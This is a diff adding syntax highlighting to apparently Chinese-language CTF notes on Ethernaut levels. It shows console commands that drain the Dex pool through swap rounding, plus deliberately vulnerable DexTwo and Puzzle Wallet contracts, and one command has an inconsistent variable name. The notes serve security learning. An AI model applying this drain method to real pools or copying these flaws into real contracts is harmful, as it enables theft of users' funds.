+        <span class="hljs-keyword">return</span> ((amount * <span class="hljs-title class_">IERC20</span>(to).<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>))) / <span class="hljs-title class_">IERC20</span>(<span class="hljs-keyword">from</span>).<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>)));
     }
 
-(amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))
+(amount * <span class="hljs-title class_">IERC20</span>(to).<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>))) / <span class="hljs-title class_">IERC20</span>(<span class="hljs-keyword">from</span>).<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>))
 </code></pre>
 <h2 id="section-11">攻击思路（简述）</h2><p>我们会交替 swap：</p>
 <ul>
@@ -1476,9 +1476,9 @@ i {negative: 0, words: Array(2), length: 1, red: null}
 <p>最终当某一边池子变到 1 时，我们只用少量输入就能换光另一边。</p>
 <h2 id="section-12">✅ 第一步</h2><p>玩家使用全部 <strong>10 token1</strong> 换 token2：</p>
 <pre><code class="language-plain">先授权
-await contract.approve(contract.address,500)
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">approve</span>(contract.<span class="hljs-property">address</span>,<span class="hljs-number">500</span>)
 
-await contract.swap(token1Addr, token2Addr, 10)
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">swap</span>(token1Addr, token2Addr, <span class="hljs-number">10</span>)
 </code></pre>
 <p>计算：</p>
 <pre><code class="language-plain">swap = 10 * 100 / 100 = 10
@@ -1494,7 +1494,7 @@ PLAYER:
 </code></pre>
 <hr>
 <h2 id="section-13">✅ 第二步</h2><p>玩家用全部 <strong>20 token2</strong> 换 token1：</p>
-<pre><code class="language-plain">await contract.swap(token2addr, token1addr, 20)
+<pre><code class="language-plain"><span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">swap</span>(token2addr, token1addr, <span class="hljs-number">20</span>)
 </code></pre>
 <p>计算：</p>
 <pre><code class="language-plain">swap = 20 * 110 / 90 = 24
@@ -1510,7 +1510,7 @@ PLAYER:
 </code></pre>
 <hr>
 <h2 id="section-14">✅ 第三步</h2><p>玩家用全部 <strong>24 token1</strong> 换 token2：</p>
-<pre><code class="language-plain">await contract.swap(token1addr, token2addr, 24)
+<pre><code class="language-plain"><span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">swap</span>(token1addr, token2addr, <span class="hljs-number">24</span>)
 </code></pre>
 <p>计算：</p>
 <pre><code class="language-plain">swap = 24 * 110 / 86 = 30
@@ -1526,7 +1526,7 @@ PLAYER:
 </code></pre>
 <hr>
 <h2 id="section-15">✅ 第四步</h2><p>玩家再用全部 <strong>30 token2</strong> 换 token1：</p>
-<pre><code class="language-plain">await contract.swap(token2addr, tokenaAddr, 30)
+<pre><code class="language-plain"><span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">swap</span>(token2addr, tokenaAddr, <span class="hljs-number">30</span>)
 </code></pre>
 <p>计算：</p>
 <pre><code class="language-plain">swap = 30 * 110 / 80 = 41
@@ -1544,7 +1544,7 @@ PLAYER:
 <h2 id="section-16">⚠️ 注意：池子此时开始失衡</h2><p>从这里开始，只需要两三步就能完全 drain。</p>
 <hr>
 <h2 id="section-17">✅ 第五步</h2><p>用全部 <strong>41 token1</strong> 换 token2：</p>
-<pre><code class="language-plain">await contract.swap(token1addr, token2addr, 41)
+<pre><code class="language-plain"><span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">swap</span>(token1addr, token2addr, <span class="hljs-number">41</span>)
 </code></pre>
 <p>计算：</p>
 <pre><code class="language-plain">swap = 41 * 110 / 69 ≈ 65
@@ -1561,7 +1561,7 @@ PLAYER:
 <p>很好！此时 token2 剩 45，你有 65，可以继续压缩池子。</p>
 <hr>
 <h2 id="section-18">🎉 最终一击（耗尽 token1 或 token2）</h2><p>你现在用大量 token2 来换 token1：</p>
-<pre><code class="language-plain">await contract.swap(token2addr, token1addr, 45)
+<pre><code class="language-plain"><span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">swap</span>(token2addr, token1addr, <span class="hljs-number">45</span>)
 </code></pre>
 <p>计算：</p>
 <pre><code class="language-plain">swap = 45 * 110 / 45 = 110
@@ -1587,74 +1587,74 @@ T2 → T1 : 45   ← 这里就爆掉一边了
 <h1>dex two</h1><p>这一关会要求你攻破<DexTwo>，这是上一关<Dex>合约经过细微修改后的版本，但需要用不同的方法。</p>
 <p>你需要从DexTwo合约中提取出token1和token2的所有余额，才能成功通过此关卡。</p>
 <p>你仍将从10个<code>token1</code>代币和10个<code>token2</code>代币开始。去中心化交易所（DEX）合约仍将从每种代币各100个开始。</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;
-import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;
-import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-08/access/Ownable.sol&quot;</span>;
 
-contract DexTwo is Ownable {
-  address public token1;
-  address public token2;
+contract <span class="hljs-title class_">DexTwo</span> is <span class="hljs-title class_">Ownable</span> {
+  address <span class="hljs-keyword">public</span> token1;
+  address <span class="hljs-keyword">public</span> token2;
 
-  constructor() {}
+  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {}
 
-  function setTokens(address _token1, address _token2) public onlyOwner {
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">setTokens</span>(<span class="hljs-params">address _token1, address _token2</span>) <span class="hljs-keyword">public</span> onlyOwner {
     token1 = _token1;
     token2 = _token2;
   }
 
-  function add_liquidity(address token_address, uint256 amount) public onlyOwner {
-    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">add_liquidity</span>(<span class="hljs-params">address token_address, uint256 amount</span>) <span class="hljs-keyword">public</span> onlyOwner {
+    <span class="hljs-title class_">IERC20</span>(token_address).<span class="hljs-title function_">transferFrom</span>(msg.<span class="hljs-property">sender</span>, <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), amount);
   }
 
-  function swap(address from, address to, uint256 amount) public {
-    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);
-    uint256 swapAmount = getSwapAmount(from, to, amount);
-    IERC20(from).transferFrom(msg.sender, address(this), amount);
-    IERC20(to).approve(address(this), swapAmount);
-    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">swap</span>(<span class="hljs-params">address <span class="hljs-keyword">from</span>, address to, uint256 amount</span>) <span class="hljs-keyword">public</span> {
+    <span class="hljs-built_in">require</span>(<span class="hljs-title class_">IERC20</span>(<span class="hljs-keyword">from</span>).<span class="hljs-title function_">balanceOf</span>(msg.<span class="hljs-property">sender</span>) &gt;= amount, <span class="hljs-string">&quot;Not enough to swap&quot;</span>);
+    uint256 swapAmount = <span class="hljs-title function_">getSwapAmount</span>(<span class="hljs-keyword">from</span>, to, amount);
+    <span class="hljs-title class_">IERC20</span>(<span class="hljs-keyword">from</span>).<span class="hljs-title function_">transferFrom</span>(msg.<span class="hljs-property">sender</span>, <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), amount);
+    <span class="hljs-title class_">IERC20</span>(to).<span class="hljs-title function_">approve</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), swapAmount);
+    <span class="hljs-title class_">IERC20</span>(to).<span class="hljs-title function_">transferFrom</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), msg.<span class="hljs-property">sender</span>, swapAmount);
   }
 
-  function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
-    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">getSwapAmount</span>(<span class="hljs-params">address <span class="hljs-keyword">from</span>, address to, uint256 amount</span>) <span class="hljs-keyword">public</span> view <span class="hljs-title function_">returns</span> (uint256) {
+    <span class="hljs-keyword">return</span> ((amount * <span class="hljs-title class_">IERC20</span>(to).<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>))) / <span class="hljs-title class_">IERC20</span>(<span class="hljs-keyword">from</span>).<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>)));
   }
 
-  function approve(address spender, uint256 amount) public {
-    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
-    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">approve</span>(<span class="hljs-params">address spender, uint256 amount</span>) <span class="hljs-keyword">public</span> {
+    <span class="hljs-title class_">SwappableTokenTwo</span>(token1).<span class="hljs-title function_">approve</span>(msg.<span class="hljs-property">sender</span>, spender, amount);
+    <span class="hljs-title class_">SwappableTokenTwo</span>(token2).<span class="hljs-title function_">approve</span>(msg.<span class="hljs-property">sender</span>, spender, amount);
   }
 
-  function balanceOf(address token, address account) public view returns (uint256) {
-    return IERC20(token).balanceOf(account);
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">balanceOf</span>(<span class="hljs-params">address token, address account</span>) <span class="hljs-keyword">public</span> view <span class="hljs-title function_">returns</span> (uint256) {
+    <span class="hljs-keyword">return</span> <span class="hljs-title class_">IERC20</span>(token).<span class="hljs-title function_">balanceOf</span>(account);
   }
 }
 
-contract SwappableTokenTwo is ERC20 {
-  address private _dex;
+contract <span class="hljs-title class_">SwappableTokenTwo</span> is <span class="hljs-title class_">ERC20</span> {
+  address <span class="hljs-keyword">private</span> _dex;
 
-  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
-  ERC20(name, symbol)
+  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address dexInstance, <span class="hljs-built_in">string</span> memory name, <span class="hljs-built_in">string</span> memory <span class="hljs-built_in">symbol</span>, uint256 initialSupply</span>)
+  <span class="hljs-title class_">ERC20</span>(name, <span class="hljs-built_in">symbol</span>)
   {
-    _mint(msg.sender, initialSupply);
+    <span class="hljs-title function_">_mint</span>(msg.<span class="hljs-property">sender</span>, initialSupply);
     _dex = dexInstance;
   }
 
-  function approve(address owner, address spender, uint256 amount) public {
-    require(owner != _dex, &quot;InvalidApprover&quot;);
-    super._approve(owner, spender, amount);
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">approve</span>(<span class="hljs-params">address owner, address spender, uint256 amount</span>) <span class="hljs-keyword">public</span> {
+    <span class="hljs-built_in">require</span>(owner != _dex, <span class="hljs-string">&quot;InvalidApprover&quot;</span>);
+    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">_approve</span>(owner, spender, amount);
   }
 }
 </code></pre>
-<pre><code class="language-solidity">await contract.address
-&#39;0x4248FeA2f12Af183E8b9AD78a711F44De1990f80&#39;
-await contract.owner()
-&#39;0xf59112032D54862E199626F55cFad4F8a3b0Fce9&#39;
-await contract.token2()
-&#39;0x916ccee7bbC6852AB384eee3aC0e4d08E7767F5a&#39;
-await contract.token1()
-&#39;0xEB8Cc829102d8d06A772Aeb0cCd2230f6f5C7dfc&#39;
+<pre><code class="language-solidity"><span class="hljs-keyword">await</span> contract.<span class="hljs-property">address</span>
+<span class="hljs-string">&#x27;0x4248FeA2f12Af183E8b9AD78a711F44De1990f80&#x27;</span>
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">owner</span>()
+<span class="hljs-string">&#x27;0xf59112032D54862E199626F55cFad4F8a3b0Fce9&#x27;</span>
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">token2</span>()
+<span class="hljs-string">&#x27;0x916ccee7bbC6852AB384eee3aC0e4d08E7767F5a&#x27;</span>
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">token1</span>()
+<span class="hljs-string">&#x27;0xEB8Cc829102d8d06A772Aeb0cCd2230f6f5C7dfc&#x27;</span>
 
 </code></pre>
 <h1>puzzle wallet</h1><p>Nowadays, paying for DeFi operations is impossible, fact.如今，为去中心化金融操作付费是不可能的，这是事实。</p>
@@ -1662,94 +1662,94 @@ await contract.token1()
 <p>They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.他们希望这份合约是可升级的，以防代码中存在漏洞，同时也想阻止群组外的人使用它。为此，他们进行了投票，并在系统中为两个人分配了特殊角色：管理员，拥有更新智能合约逻辑的权力；所有者，控制着被允许使用该合约的地址白名单。合约部署完成后，该群组被加入白名单。所有人都为他们在对抗恶意矿工方面取得的成就而欢呼。</p>
 <p>Little did they know, their lunch money was at risk…他们万万没想到，自己的午餐钱正处于危险之中……</p>
 <p>You&#39;ll need to hijack this wallet to become the admin of the proxy.你需要劫持这个钱包才能成为代理的管理员</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-import &quot;../helpers/UpgradeableProxy-08.sol&quot;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;../helpers/UpgradeableProxy-08.sol&quot;</span>;
 
-contract PuzzleProxy is UpgradeableProxy {
-    address public pendingAdmin;
-    address public admin;
+contract <span class="hljs-title class_">PuzzleProxy</span> is <span class="hljs-title class_">UpgradeableProxy</span> {
+    address <span class="hljs-keyword">public</span> pendingAdmin;
+    address <span class="hljs-keyword">public</span> admin;
 
-    constructor(address _admin, address _implementation, bytes memory _initData)
-        UpgradeableProxy(_implementation, _initData)
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address _admin, address _implementation, bytes memory _initData</span>)
+        <span class="hljs-title class_">UpgradeableProxy</span>(_implementation, _initData)
     {
         admin = _admin;
     }
 
-    modifier onlyAdmin() {
-        require(msg.sender == admin, &quot;Caller is not the admin&quot;);
+    modifier <span class="hljs-title function_">onlyAdmin</span>(<span class="hljs-params"></span>) {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">sender</span> == admin, <span class="hljs-string">&quot;Caller is not the admin&quot;</span>);
         _;
     }
 
-    function proposeNewAdmin(address _newAdmin) external {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">proposeNewAdmin</span>(<span class="hljs-params">address _newAdmin</span>) external {
         pendingAdmin = _newAdmin;
     }
 
-    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
-        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">approveNewAdmin</span>(<span class="hljs-params">address _expectedAdmin</span>) external onlyAdmin {
+        <span class="hljs-built_in">require</span>(pendingAdmin == _expectedAdmin, <span class="hljs-string">&quot;Expected new admin by the current admin is not the pending admin&quot;</span>);
         admin = pendingAdmin;
     }
 
-    function upgradeTo(address _newImplementation) external onlyAdmin {
-        _upgradeTo(_newImplementation);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">upgradeTo</span>(<span class="hljs-params">address _newImplementation</span>) external onlyAdmin {
+        <span class="hljs-title function_">_upgradeTo</span>(_newImplementation);
     }
 }
 
-contract PuzzleWallet {
-    address public owner;
-    uint256 public maxBalance;
-    mapping(address =&gt; bool) public whitelisted;
-    mapping(address =&gt; uint256) public balances;
+contract <span class="hljs-title class_">PuzzleWallet</span> {
+    address <span class="hljs-keyword">public</span> owner;
+    uint256 <span class="hljs-keyword">public</span> maxBalance;
+    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> bool) <span class="hljs-keyword">public</span> whitelisted;
+    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256) <span class="hljs-keyword">public</span> balances;
 
-    function init(uint256 _maxBalance) public {
-        require(maxBalance == 0, &quot;Already initialized&quot;);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">uint256 _maxBalance</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-built_in">require</span>(maxBalance == <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Already initialized&quot;</span>);
         maxBalance = _maxBalance;
-        owner = msg.sender;
+        owner = msg.<span class="hljs-property">sender</span>;
     }
 
-    modifier onlyWhitelisted() {
-        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);
+    modifier <span class="hljs-title function_">onlyWhitelisted</span>(<span class="hljs-params"></span>) {
+        <span class="hljs-built_in">require</span>(whitelisted[msg.<span class="hljs-property">sender</span>], <span class="hljs-string">&quot;Not whitelisted&quot;</span>);
         _;
     }
 
-    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
-        require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">setMaxBalance</span>(<span class="hljs-params">uint256 _maxBalance</span>) external onlyWhitelisted {
+        <span class="hljs-built_in">require</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span> == <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Contract balance is not 0&quot;</span>);
         maxBalance = _maxBalance;
     }
 
-    function addToWhitelist(address addr) external {
-        require(msg.sender == owner, &quot;Not the owner&quot;);
-        whitelisted[addr] = true;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">addToWhitelist</span>(<span class="hljs-params">address addr</span>) external {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">sender</span> == owner, <span class="hljs-string">&quot;Not the owner&quot;</span>);
+        whitelisted[addr] = <span class="hljs-literal">true</span>;
     }
 
-    function deposit() external payable onlyWhitelisted {
-        require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);
-        balances[msg.sender] += msg.value;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">deposit</span>(<span class="hljs-params"></span>) external payable onlyWhitelisted {
+        <span class="hljs-built_in">require</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span> &lt;= maxBalance, <span class="hljs-string">&quot;Max balance reached&quot;</span>);
+        balances[msg.<span class="hljs-property">sender</span>] += msg.<span class="hljs-property">value</span>;
     }
 
-    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
-        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);
-        balances[msg.sender] -= value;
-        (bool success,) = to.call{value: value}(data);
-        require(success, &quot;Execution failed&quot;);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">address to, uint256 value, bytes calldata data</span>) external payable onlyWhitelisted {
+        <span class="hljs-built_in">require</span>(balances[msg.<span class="hljs-property">sender</span>] &gt;= value, <span class="hljs-string">&quot;Insufficient balance&quot;</span>);
+        balances[msg.<span class="hljs-property">sender</span>] -= value;
+        (bool success,) = to.<span class="hljs-property">call</span>{<span class="hljs-attr">value</span>: value}(data);
+        <span class="hljs-built_in">require</span>(success, <span class="hljs-string">&quot;Execution failed&quot;</span>);
     }
 
-    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
-        bool depositCalled = false;
-        for (uint256 i = 0; i &lt; data.length; i++) {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">multicall</span>(<span class="hljs-params">bytes[] calldata data</span>) external payable onlyWhitelisted {
+        bool depositCalled = <span class="hljs-literal">false</span>;
+        <span class="hljs-keyword">for</span> (uint256 i = <span class="hljs-number">0</span>; i &lt; data.<span class="hljs-property">length</span>; i++) {
             bytes memory _data = data[i];
             bytes4 selector;
             assembly {
-                selector := mload(add(_data, 32))
+                selector := <span class="hljs-title function_">mload</span>(<span class="hljs-title function_">add</span>(_data, <span class="hljs-number">32</span>))
             }
-            if (selector == this.deposit.selector) {
-                require(!depositCalled, &quot;Deposit can only be called once&quot;);
-                // Protect against reusing msg.value
-                depositCalled = true;
+            <span class="hljs-keyword">if</span> (selector == <span class="hljs-variable language_">this</span>.<span class="hljs-property">deposit</span>.<span class="hljs-property">selector</span>) {
+                <span class="hljs-built_in">require</span>(!depositCalled, <span class="hljs-string">&quot;Deposit can only be called once&quot;</span>);
+                <span class="hljs-comment">// Protect against reusing msg.value</span>
+                depositCalled = <span class="hljs-literal">true</span>;
             }
-            (bool success,) = address(this).delegatecall(data[i]);
-            require(success, &quot;Error while delegating call&quot;);
+            (bool success,) = <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">delegatecall</span>(data[i]);
+            <span class="hljs-built_in">require</span>(success, <span class="hljs-string">&quot;Error while delegating call&quot;</span>);
         }
     }
 }
